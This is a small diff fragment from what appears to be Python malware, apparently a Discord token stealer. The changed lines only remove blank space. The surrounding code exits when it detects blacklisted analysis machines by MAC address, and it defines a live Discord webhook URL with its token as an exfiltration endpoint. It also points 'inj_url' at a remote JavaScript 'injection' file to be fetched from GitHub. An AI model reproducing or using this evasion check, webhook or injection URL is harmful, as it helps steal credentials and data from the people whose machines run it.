@@ -59,9 +59,6 @@ mac_address = uuid.getnode()
 if str(uuid.UUID(int=mac_address)) in BLACKLIST1:
     os._exit(0)
 
-
-
-
 wh00k = "https://discord.com/api/webhooks/1181962806740918324/j56QhEBP0a-nDKECwbpaAExP6rQk0QNgwWmTSKKAL3KS5YkBAzfrL_FA_1679TbH0R2f"
 inj_url = "https://raw.githubusercontent.com/Ayhuuu/injection/main/index.js"
     
